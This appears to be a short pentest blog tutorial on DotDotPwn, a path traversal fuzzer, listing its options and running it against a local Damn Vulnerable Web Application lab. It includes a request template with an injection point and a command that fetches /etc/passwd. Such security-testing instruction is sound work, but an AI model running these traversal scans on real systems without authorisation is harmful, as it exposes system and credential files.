---
title: DotDotPwn
tags:
- pentest
- path traversal
see_also:
  -
    link: OWASP Path Traversal
    url: https://www.owasp.org/index.php/Path_Traversal
  -
    link: Damn Vulnerable Web Application
    url: http://blog.10degres.net/damn-vulnerable-web-application/
---
Path traversal is a very powerful attack but not necessarily easy to find, fortunatly DotDotPwn is here to help you! [DotDotPwn](http://dotdotpwn.blogspot.fr/ "DotDotPwn"){:class="flashlink" target="_blank"} is a powerful traversal directory fuzzer. 
Written in perl, it's installed in Kali Linux by default.

Basic usage is:

`dotdotpwn.pl -m <module> -h <host>`

Several options are available:

-h: the host you want to test  
-m: it supports http, ftp or text file as a payload  
-o and -O: enable the operating system detection  
-d: max depth it will look for (ie. max `../`)  
-f : file to grab (default is `/etc/passwd` for *nix system)  
-E: try to grab some extra files depending of the os detection result  
-S: ssl support  
-x: specify the port  
-r: output file  
-q: quiet mode  
-k: keyword to match in the response who means a win  
-b: exit after the first vulnerability found  
-M: http method to use with http module (can't make it work)  
-e: add an extension (.php, .png, ...)  

and some more...

<!--more-->

Example:

[![dotdotpwn](/images/dotdotpwn_1.png)](/images/dotdotpwn_1.png)

Will produce the following Apache logs (note that the User-Agent is different for each request):

[![dotdotpwn](/images/dotdotpwn_2.png)](/images/dotdotpwn_2.png)

To deal with session and cookies you can use a payload to provide details about the HTTP request. 
The keyword `TRAVERSAL` is required by DotDotPwn to specify where the injection should be performed. 
For instance in the file inclusion section in DVWA, you can try this:

~~~
GET /vulnerabilities/fi/?page=TRAVERSAL HTTP/1.1
Host: local.dvwa.com
Cookie: security=low; PHPSESSID=rcvkns45jv1i62t1c4jqj8ogu4
~~~

With the following command:

`$ dotdotpwn.pl -m payload -h local.dvwa.com -p ~/dvwa_fi.txt -x 80 -k "root:" -f /etc/passwd`
